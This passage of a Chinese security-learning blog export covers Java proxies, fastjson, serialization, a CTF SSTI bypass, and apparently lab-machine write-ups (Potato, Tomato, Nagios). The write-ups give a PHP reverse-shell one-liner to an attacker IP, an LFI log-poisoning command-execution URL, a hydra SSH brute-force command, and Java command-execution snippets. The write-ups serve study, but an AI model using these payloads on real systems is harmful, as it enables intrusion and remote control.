this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;删除&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;更新&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;查询&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]执行了&quot;+name+&quot;方法&quot;); &#125;&#125; 而使用动态代理之后： 2.3代理类123456789101112131415161718192021222324252627282930package Demo3;import myProxy2.UserServiceImp;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler &#123; private UserServiceImp userServiceImp;// IOC，让用户自定义需要什么接口来决定代理类 public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125;// 生成代理类 public Object getProxy()&#123; return Proxy.newProxyInstance(this.getClass().getClassLoader(), userServiceImp.getClass().getInterfaces(),this); &#125; // 必须重写的接口，并返回接口 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; Object result = method.invoke(userServiceImp, args); return result; &#125;&#125; 我们发现不再需要一个一个套模板往上写了，如果我们需要增添新功能，只需要这样做： 1234567891011 // 必须重写的接口，并返回接口 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; log(method.getName()); Object result = method.invoke(userServiceImp, args); return result; &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]使用了&quot;+name+&quot;方法&quot;); &#125;&#125; 虽然我们前面去写生成一个的代码量看似很大，但是实际上这段代码是一个工具用的代码，是写死的。业务代码相当的端，从几十行骤减到十来行，并且我们的代理类不会随着工程的变大而变大，我们通过反射之后获取了类的方法 而源码当中，invoke方法实际上也是通过setAccessible来实现的","categories":[],"tags":[]},{"title":"静态代理","slug":"静态代理","date":"2020-11-09T13:36:53.000Z","updated":"2020-11-17T06:15:20.429Z","comments":true,"path":"2020/11/09/静态代理/","link":"","permalink":"http://example.com/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"好久没用了都有点忘了，现在捡起来学一下，之后还有用 静态代理结合出租房子理解 通过图示，我们分析一个例子： 客户需要租一个房子 房东需要租出房子 这个时候两者之间的合同很纯粹，如果两者认识，就不需要中介，直接对接把房子租出去就很简单很快了对吧？但是现实往往不是这样，更可能的是如下情况： 房东和客户互不相识，需要签订各种合同保证对方不会后悔 一个客户肯定不会只看房子，他需要看多个房子来选择自己心仪的房子 房东不可能时时刻刻都守着房子，等一个一个的客户上门来看 在这种情况下，用户的需求和房东的客户都相当不纯粹了，需要经过很多步骤才可以转换到位 在现实生活中，正是由于这种情况的出现，所以出现了房屋中介，解决各种客户的情况，由房屋中介来给客户们解决各种问题，经过中介处理，双方的情况又变得纯粹了起来，而繁琐的事情交给中介来处理即可 而代码一样如此，这种情况的出现几乎处处可见，比如我们可能需要处理数据库，中间需要对数据进行各种处理，这种情况就和上面的合同一样。 话说回来，我们如何处理租房子的情况呢？这里我写了一小段代码来做出范例： 我们可以将这个事情抽象成四个part： 出租房子这件事情 谁出租？ 房东 谁要房子？ 客户 谁来处理复杂情况？ 中介 分析完之后我们可以着手于代码 出租房子这件事情： 12345package Proxy;public interface Rent &#123; public void rent();&#125; 房东: 12345678package Proxy;public class Host implements Rent&#123; public void rent() &#123; System.out.println(&quot;房东租出房子&quot;); &#125;&#125; 中介： 123456789101112131415161718192021222324252627package Proxy;public class MyProxy implements Rent &#123; private Host host; public MyProxy(Host host) &#123; this.host = host; &#125; public void rent() &#123; seeHouse(); host.rent(); takeMoney(); giveMoney(); &#125; public void seeHouse()&#123; System.out.println(&quot;中介带你看房子&quot;); &#125; public void takeMoney()&#123; System.out.println(&quot;中介收你钱&quot;); &#125; public void giveMoney()&#123; System.out.println(&quot;中介给钱给房东&quot;); &#125;&#125; 客户： 123456789101112package Proxy;import org.junit.Test;public class MyTest &#123; @Test public void test1()&#123; MyProxy proxy = new MyProxy(new Host()); proxy.rent(); &#125;&#125; 在上面的例子当中，我们可以发现，静态代理帮我们完成了如下事情： 使得需要再次明确起来，无论是客户还是房东，需求都变得相当简单 复杂的事情交给了中介来做 但是我们也发现了一个缺点： 我们的代码量明显提升了很多，相比于直接添加功能 除此之外，如果客户很多，我们不得不手动添加一个个客户，工作量更大了。 结合增删改查事务理解在上面的例子中，我们学习到了代理模式的第一个好处，接下的例子将进一步表露出上面的设计模式的好处，并且它会展现静态代理的第二个好处，添加新功能而不修改原有代码 增删改查事务： 12345678package Proxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; 业务实现： 12345678910111213141516171819package Proxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;增添了一个新用户&quot;); &#125; public void delete() &#123; System.out.println(&quot;删除了一个用户&quot;); &#125; public void update() &#123; System.out.println(&quot;更新了一个用户&quot;); &#125; public void query() &#123; System.out.println(&quot;查询了一个用户&quot;); &#125;&#125; 这时候我们突然想要添加新功能，打印我们使用了什么功能改怎么办？我们很明显可以这样做： 1234public void query() &#123; System.out.println(&quot;使用了查询功能&quot;); System.out.println(&quot;查询了一个用户&quot;); &#125; 但是很明显这种方式非常笨拙，并且如果是更多的功能，程序员就必须手写，并且一段一段的复制差不多的代码！（这里四个输出语句就让我感觉有点烦躁了 我们结合代理模式，其实可以很优雅的解决它： 12345678910111213141516171819202122232425262728293031323334package Proxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;删除&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;更新&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;查询&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]执行了&quot;+name+&quot;方法&quot;); &#125;&#125; 这时候我们就解决了功能的需求，并且，我们没有修改任何一行原代码，却上线了新的功能，除此之外，我们的代码拓展性依然很高，需要添加新功能只需要添加新的代理层即可，这时候我们将引出了第三个思想： 任何功能的添加，修改，引入新的代理层来解决，客户只需要去导入最后一个代理增即可","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"Potato和Tomato渗透","slug":"Potato和Tomato渗透","date":"2020-11-08T13:00:22.000Z","updated":"2020-11-17T06:10:18.624Z","comments":true,"path":"2020/11/08/Potato和Tomato渗透/","link":"","permalink":"http://example.com/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/","excerpt":"","text":"Potato渗透也是经典的dirb和nmap扫一波 nmap的结果 dirb的结果 也就发现了一个info.php能用，访问一些是phpinfo，呃，那再看看nmap，开了7120端口，看看，啥都没有，只能通过hypdra进行爆破咯，呃，账号密码都不知道，只能试试看了 1hydra 192.168.1.113 ssh -s 7120 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f 登陆上之后查看uname -a 查看能不能提权 看见内核为ubuntu3.多，这种老版本一般可以直接提，尝试搜索 123potato@ubuntu:/tmp$ uname -aLinux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux searchsploit Ubuntu 3.13.0 利用-p指令找到存放位置，之后我们就可以直接拿下exp了，再上传到靶机的tmp目录下（因为tmp目录大部分情况下是777权限 成功拿下！ Tomato渗透首先经典drib和nmap扫一波 nmap： 1nmap -sS -v -T4 -Pn -A -p 0-65535 发现8888端口和21，开了其他tcp和ssh的端口,但是都没法用，在info.php下发现文件包含 尝试包含了一下etc/passwd就卡住了，不知道该怎么做。。 这里记录下各个log的文件 1234567891011121314151617189)/var/run/utmp 记录着现在登录的用户;10)/var/log/lastlog 记录每个用户最后的登录信息;11)/var/log/btmp 记录错误的登录尝试;12)/var/log/dmesg内核日志;13)/var/log/cpus CPU的处理信息；14)/var/log/syslog 事件记录监控程序日志；15)/var/log/auth.log 用户认证日志；16)/var/log/daemon.log 系统进程日志；17)/var/log/mail.err 邮件错误信息；18)/var/log/mail.info 邮件信息；19)/var/log/mail.warn 邮件警告信息；20)/var/log/daemon.log 系统监控程序产生的信息;21)/var/log/kern 内核产生的信息;22)/var/log/lpr 行打印机假脱机系统产生的信息; 根据大佬的payload，其实我们可以知道，在当前环境下我们可以控制的log文件只有auth.log,因为只有个这个日志我们可以操作，比如我们写入一句话，再进行包含的话，不就是执行了命令了吗（这个思路真的骚 所以我们马上操作一波，这里我用xshell脸上·的 马上执行命令： 1view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls 再之后为了能够传脚本啥的啊，我们执行一波反弹shell： 1php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; urlencode一下 1php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27; 弹到自己本机上即可。 接下来我们求一个交互式的shell，发现python3可以用，所以接下来用Python打开一个交互式的shell 1python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 之后uname -a 看内核，exp一冲就完事了 1grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null 我他妈直接一把梭","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Nagios渗透","slug":"Nagios渗透","date":"2020-11-08T11:38:31.000Z","updated":"2020-11-08T12:44:22.850Z","comments":true,"path":"2020/11/08/Nagios渗透/","link":"","permalink":"http://example.com/2020/11/08/Nagios%E6%B8%97%E9%80%8F/","excerpt":"","text":"第一步：经典NMAP 1nmap -sS -v -T4 -Pn -A -p 0-65535 172.192.168.235.135 drib 1dirb http://192.168.29.128/ Nmap的结果如下： 而dirb的结果： 感觉有点鸡肋啊..dirb的结果 第二步WTM直接用exp库 1searchsploit nagios msfconsole 1search nagios 之后使用show options查看我们需要填写什么 查看还需要设置的选项 show options，为YES且空的就是还需要我们设置的。 可以看到下图中RHOST参数还未设置内容 发现这个需要设置密码，于是尝试测试默认密码登陆NagiosXI，在该文章中得到账号为NagiosAdmin 1https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html 密码为admin 这里讲一下msfconsole怎么用的.. msfconsole首先search 漏洞 show options 可以查看有什么条件我们还没有设置 再之后设置rhost和lhost，其中rhost为被攻击的机子 lhost为攻击机，也就是我们的kali 之后直接run，发现失败 123] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.[*] Exploit completed, but no session was created. 于是把我们刚刚得到的password填写上去admin 得到run之后执行shell，whoami查看权限就是root了","categories":[],"tags":[]},{"title":"太湖杯easyweb","slug":"太湖杯easyweb","date":"2020-11-07T11:47:54.000Z","updated":"2020-11-17T06:15:31.811Z","comments":true,"path":"2020/11/07/太湖杯easyweb/","link":"","permalink":"http://example.com/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/","excerpt":"","text":"感觉太湖杯的题目都挺难的..这次自己制作出来一道题，是一道SSTI，做的时候一开始还以为是nodejs进行命令执行什么的 难点这道题的难点主要是过滤掉了花括号，和双引号等。 做题思路这道题初看就感觉是一道SSTI，但是刚开始的时候被花括号卡住了，搞得我以为是是其他题目，结果相当想到A1CTF独角兽那道题目，才有了思路，首先，我们可以确定的是，我们输入一些花里胡哨的东西会被转换为标准的字符串输出，如图： 于是我联想到可以通过输入类似的花括号的utf8编码下的字符串进行绕过： 1https://www.compart.com/en/unicode/U+FE5C 其中这一行 UTF-8 Encoding: 0xEF 0xB9 0x9C 我们将0x修改为百分号即可 之后就是正常的SSTI了，我们将不需要引号的payload往上上一甩就行了 事后事后发现其实还可以利用这种方式进行命令执行：","categories":[],"tags":[{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"JavaSerialize","slug":"JavaSerialize","date":"2020-11-02T12:10:22.000Z","updated":"2020-11-03T12:49:27.595Z","comments":true,"path":"2020/11/02/JavaSerialize/","link":"","permalink":"http://example.com/2020/11/02/JavaSerialize/","excerpt":"","text":"JAVA当中对于文件的处理都是通过IO流进行操作的 一些IO流的API FileOutputStream 写入流，我们用该流可以写入内容到文件当中 FileInputStream 读取流 ObjectOutputStream 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化操作。 ObjectInputStream 反序列化并打印数据 JAVA反序列化过程首先我们要明白，Java的序列化与反序列化的过程是如何产生的，我们可以编写如下代码： 123456789101112131415161718192021222324import java.io.*;public class demo1&#123; public static void main(String[] args) throws Exception &#123; String obj = &quot;ls &quot;; // 将序列化对象写入文件aa.ser中 FileOutputStream fos = new FileOutputStream(&quot;aa.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // aa.ser中读取数据 FileInputStream fis = new FileInputStream(&quot;aa.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象obj,注意这里使用强转 String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); &#125;&#125; 通过这串代码，我们将数据ls传入到了aa.ser当中，并且将其重新释放了出来。我们成功通过写入序列化文件并将其成功返回。 实现Serializable和Externalizable接口的类的对象才能被序列化。故我们写一个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import java.io.*;import java.text.MessageFormat;public class Demo2 &#123; public static void SerializePerson() throws IOException &#123; Person person = new Person(); person.setAge(19); person.setName(&quot;sakani&quot;); // person.setSex(true); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;Demo2.txt&quot;)); oos.writeObject(person); &#125; //因为文件可能不存在，此时需要处理异常 public static Person UnSerializePerson() throws IOException, ClassNotFoundException &#123;// 读取文件 FileInputStream fileInputStream = new FileInputStream(new File(&quot;Demo2.txt&quot;));// 到这一步来读取了文件流，下一步将其强转回对象 ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);// readObject 是用来读取该流当中的对象 Person person2 = (Person)objectInputStream.readObject(); System.out.println(person2.getAge()); return person2; &#125; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; SerializePerson();// 这个方法用于序列化函数 Person person2 = UnSerializePerson(); System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;,person2.getName(),person2.getAge())); &#125;&#125;//必须要实现序列化接口才可以进行序列化class Person implements Serializable &#123; private String name; private int age; private boolean sex; public Person() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public boolean isSex() &#123; return sex; &#125; public void setSex(boolean sex) &#123; this.sex = sex; &#125;&#125; Java命令执行函数1.java.lang.Runtime12345678910111213141516171819202122232425262728293031323334353637383940import org.junit.Test;import java.io.IOException;import java.io.InputStream;public class RuntimeTest &#123; @Test public void test1() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;calc&quot;,&quot;&amp;&quot;,&quot;notepad&quot;&#125;); &#125; @Test public void test2() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd /c calc &amp; notepad&quot;); &#125; @Test public void test3() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd.exe /k calc &amp; notepad&quot;); &#125; @Test public void test4() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); Process start = runtime.exec(&quot;ping sakani.top&quot;); InputStream inputStream = start.getInputStream(); byte[] res = new byte[1024]; inputStream.read(res); System.out.println(new String(res,&quot;gbk&quot;)); &#125;&#125;class Test1&#123;&#125; 注意，第一种方式告诉我们可以用数组来传入命令，第二种则是告诉字符串的方式，第四种则是意味着我们可以执行反弹shell,但是用该方法的时候我只得到了一条ping的数据，如图所示，所以我认为可能并不是很靠谱 2.java.lang.ProcessBuilder123456789101112@Testpublic void test5() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;calc&quot;); Process start = processBuilder.start();&#125;@Testpublic void test6() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe &quot;,&quot;/c calc&quot;); processBuilder.start();&#125; 该方法也可以成功执行函数，但需要注意的是，使用的时候需要指定两个参数，第一个是执行什么文件，第二个才是命令 3.java.lang.Processlmpl这种方法是ProcessBuilder的父类，但是因为其为私有类，我们需要获取的时候只能通过反射的方式来获取 123456789@Testpublic void test7() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class&lt;?&gt; aClass = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method start = aClass.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); start.setAccessible(true); start.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, null, null, false);&#125; 让我比较疑惑的是这里为什么没有使用cmd，直接使用的null，却可以成功得到运行呢？ 稍微审计了以下源码，看到了如下： 123456static Process start(String cmdarray[], //注意这里，传入的就是cmdarray java.util.Map&lt;String,String&gt; environment, String dir, ProcessBuilder.Redirect[] redirects, boolean redirectErrorStream) throws IOException 顺便补充一下反射的几个知识： class.forName用于反射类，指定类名即可 class.getDeclaredMethod 用于映射类中的方法 invoke ，开始调用该方法， 传入参数即可使用 4. javax.script.ScriptEngineMana本质上还是使用上面的三种方法： 12345@Testpublic void test8() throws ScriptException &#123; Object scriptEngineManager = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;); System.out.println(scriptEngineManager);&#125; 这里我比较惊讶，为什么输出语句也可以执行命令呢？","categories":[],"tags":[]},{"title":"fastJson","slug":"fastJson","date":"2020-11-02T08:11:59.000Z","updated":"2020-11-17T06:17:04.494Z","comments":true,"path":"2020/11/02/fastJson/","link":"","permalink":"http://example.com/2020/11/02/fastJson/","excerpt":"","text":"JUnit4在学习fastjson之前，感觉有必要先学习一下Junit4的注解，自从SpringBoot之后注解大量的被使用， JUnit出现的与因为main方法测试很不方便，摘自百度的部分： 12用main方法测试的话就很不方便，想测试全部方法的话就得把测试代码全部写到里，或者你测一个重写一次。且更重要的是，这样会使测试代码与运行逻辑代码混在一起，不规范。使用junit就方便多了,这是单元测试，你想测哪个方法就写一个对应的测试方法，然后用junit运行。每个方法之间是独立的，非常灵活。而且测试方法一般不会直接写在原类中，而是单独的测试类，这样测试代码就完全与逻辑代码分开了。 而在Junit4大量使用了从Java5中开始使用的注解，如下是JUnit4常用的注解： before，test，after Before：初始化方法，针对每个测试方法，都会执行一遍 Test: 代替main函数，可以让我们灵活的测试某部分代码,注意，测试的时候不要写一个Test类！！！！，否则因为会有限选择同包下的test类，导致报错,@Test方法所在类中,不能存在有参数构造函数,无参构造可以存在 After：在方法结束之后执行，每次都会执行！ 例子： 12345678910111213141516171819202122package com.ys.pojo;import org.junit.After;import org.junit.Before;import org.junit.Test;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;最先被执行！&quot;); &#125; @Test public void test()&#123; System.out.println(&quot;wdnmd&quot;); &#125; @After public void after()&#123; System.out.println(&quot;我之后才会被执行呢&quot;); &#125;&#125; 除此之外，Test注解还允许我们添加参数，检测是否抛出某部分异常： 例子： 12345678 @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; &#125;&#125; 当代码出现异常的时候，则不会抛出异常，相反的，如果这段代码正常抛出，就会抛出异常了。 beforeclass，afterclass BeforeClass: 在所有类被执行之前执行，只会执行一次，同时必须为static静态方法（因为他们就相当于此） AfterClass: 在所有类被执行之后执行 1234567891011121314151617181920212223242526272829303132333435363738394041package com.ys.pojo;import org.junit.*;import java.lang.reflect.Array;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;我就相当于构造器！&quot;); &#125; @Test public void test1()&#123; System.out.println(&quot;我是test1，我被执行了&quot;); &#125; @After public void after()&#123; System.out.println(&quot;我之后才会被执行&quot;); &#125; @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; System.out.println(&quot;我是test2执行了！&quot;); &#125; @BeforeClass public static void beforeClass()&#123; System.out.println(&quot;我在所有的前面被执行，并且我只会执行一次！&quot;); &#125; @AfterClass public static void afterClass()&#123; System.out.println(&quot;我在最终所有结束之后才会被执行&quot;); &#125;&#125; Ignore Ignore可以让我们暂时的禁用特定的类，被注解之后的类将不再被执行 Ignore经过我测试，只有当他放在测试类前才可以生效。 例子： 而如果我们放在其他类前面： 我们可以发现依然被执行了！ Runwith Runwith放在测试类之前，用于确定这个类该如何运行，我们也可以不标注，将会使用默认的运行容器 可以看这篇文章来理解： 1https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg Fastjson Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。 Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。 Fastjson 源码地址：https://github.com/alibaba/fastjson Fastjson 中文 Wiki：https://github.com/alibaba/fastjson/wiki/Quick-Start-CN 也就是说，程序员们用这个程序就是为了传运JSON格式的对象，呃，感觉像序列化一样了？ 将JAVA对象转换成json格式123456789101112131415161718192021222324252627package com.ys.pojo;import com.alibaba.fastjson.JSON;import org.junit.Before;import org.junit.Test;import java.util.ArrayList;import java.util.Date;import java.util.List;public class Fortest &#123; private List&lt;JavaToJson&gt; listOfJava = new ArrayList&lt;JavaToJson&gt;(); @Before public void setUp()&#123; listOfJava.add(new JavaToJson(18,&quot;wndmd&quot;,new Date())); listOfJava.add(new JavaToJson(20,&quot;Json!&quot;,new Date())); &#125; @Test public void test()&#123; String list = JSON.toJSONString(listOfJava); System.out.println(list); &#125;&#125; 注意，上述代码需要另外起一个类，test不允许在有参构造的类中出现 得到输出结果： 1234567891011[ &#123;&quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] 我们还可以格式化自定义输出，控制字段的排序。 我们更新bean并添加如下字段： 123456789public class JavaToJson &#123; @JSONField(name = &quot;Age&quot;,serialize = false) private int age; @JSONField(name = &quot;FULL NAME&quot;,ordinal = 2) private String fullName; @JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1) private Date date; 注意在这里我们添加serialize = false，这里是默认我们添加序列化，如果我们设置为false，该字段将不会被显示。 而ordinal，则是用于规定格式化的顺序，需要注意的是，如果你想控制，最好就全部都使用该属性修饰，或者你自己干脆写的时候就从上向下写，不然的话，默认从上向下执行，只会再按照ordinal限定的顺序排列 上述代码输出： 12345678910[ &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] 如果将serialize的false去掉之后，他还是第一个被执行： 123456789101112[ &#123; &quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] 作用对象@JSONField 的作用对象: Field Setter 和 Getter 方法 需要注意如下两点： 注意：FastJson 在进行操作时，是根据 getter 和 setter 的方法进行的，并不是依据 Field 进行。 注意：若属性是私有的，必须有 set 方法。否则无法反序列化。 跟进JSONField查看源码，可以知道我们允许指定很多东西=。=： 1234567891011121314151617181920212223242526272829public @interface JSONField &#123; int ordinal() default 0; String name() default &quot;&quot;; String format() default &quot;&quot;; boolean serialize() default true; //注意这里，反序列化！ boolean deserialize() default true; SerializerFeature[] serialzeFeatures() default &#123;&#125;; Feature[] parseFeatures() default &#123;&#125;; String label() default &quot;&quot;; boolean jsonDirect() default false; Class&lt;?&gt; serializeUsing() default Void.class; Class&lt;?&gt; deserializeUsing() default Void.class; String[] alternateNames() default &#123;&#125;; boolean unwrapped() default false; String defaultValue() default &quot;&quot;;&#125; 配置方式FieldInfo 可以配置在 getter/setter 方法或者字段上。例如： 配置在 getter/setter 上12345678public class A &#123; private int id; @JSONField(name=&quot;ID&quot;) public int getId() &#123;return id;&#125; @JSONField(name=&quot;ID&quot;) public void setId(int value) &#123;this.id = id;&#125;&#125; 配置在 field 上1234567public class A &#123; @JSONField(name=&quot;ID&quot;) private int id; public int getId() &#123;return id;&#125; public void setId(int value) &#123;this.id = id;&#125;&#125; 创建 JSON 对象创建 JSON 对象非常简单，只需使用 JSONObject（fastJson提供的json对象） 和 JSONArray（fastJson提供json数组对象） 对象即可。 虽然JSONArryay也可以创建一个JSON对象，但我觉得书写方式不够美观，其中如下： 123456789101112@Testpublic void whenGenerateJson_thanGenerationCorrect() throws ParseException &#123; JSONArray jsonArray = new JSONArray(); for (int i = 0; i &lt; 2; i++) &#123; JSONObject jsonObject = new JSONObject(); jsonObject.put(&quot;AGE&quot;, 10); jsonObject.put(&quot;FULL NAME&quot;, &quot;Doe &quot; + i); jsonObject.put(&quot;DATE OF BIRTH&quot;, &quot;2016/12/12 12:12:12&quot;); jsonArray.add(jsonObject); &#125; String jsonOutput = jsonArray.toJSONString();&#125; JSON 字符串转换为 Java 对象fastjson允许我们可以将前端传来的数据转换变成JSON数据，同样的也允许我们把后端数据转换为JSON字符串丢给前端。 123456789101112 @Test public void jsonToJava()&#123; JavaToJson miaomiaomiao = new JavaToJson(21, &quot;miaomiaomiao&quot;, new Date()); String jsonObject = JSON.toJSONString(miaomiaomiao);// System.out.println(jsonObject);// 这前面的part我们将数据转换成了JSON数据 JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);// 指定需要转换的JSON字符串，并且指定原型,这样的话一个JAVA对象就指定好了 System.out.println(newJavaObject.getAge()); System.out.println(newJavaObject.getFullName()); &#125; 使用ContextValuFilter配置JSON转换在有些场景中，对Value做过滤，需要获得所述JavaBean的信息，而我们可能想要过滤某些信息，便可以使用该方法进行操作了。 123456789101112131415161718192021222324@Before public void before()&#123; listOfJava.add(new JavaToJson(31,&quot;wdnmd&quot;,new Date())); listOfJava.add(new JavaToJson(33,&quot;wd&quot;,new Date())); &#125; @Test public void givenContextFilter_whenJavaObject_thanJsonCorrect() &#123; ContextValueFilter valueFilter = new ContextValueFilter () &#123; public Object process( BeanContext context, Object object, String name, Object value) &#123; if (name.equals(&quot;DATE OF BIRTH&quot;)) &#123; return &quot;NOT TO DISCLOSE&quot;; &#125; if (value.equals(&quot;wdnmd&quot;)) &#123; return ((String) value).toUpperCase(); &#125; else &#123; return null; &#125; &#125; &#125;; String jsonOutput = JSON.toJSONString(listOfJava, valueFilter); System.out.println(jsonOutput); &#125; 经过上述代码的操作，我们的时间将会修改为NOT TO DISCLOSE，并且数据中不包含wdnmd的将会被过滤,具体输出如下： 1234567891011121314[ &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot;,&quot;FULL NAME&quot;:&quot;wdnmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;]","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"NPUCTF2020","slug":"NPUCTF2020","date":"2020-10-30T01:00:15.000Z","updated":"2020-10-31T07:01:18.480Z","comments":true,"path":"2020/10/30/NPUCTF2020/","link":"","permalink":"http://example.com/2020/10/30/NPUCTF2020/","excerpt":"","text":"web🐕列表内容复制粘贴，丢python里面跑一轮就行了 123list = [102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]for i in list: print(chr(i),end=&#x27;&#x27;) 啊，别看了，这上面太丢人了。。。原来是因为这是最后一步， ReadlezPHP这道题目和之前在网鼎杯做的phpweb很像，一样的是进行动调： 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new 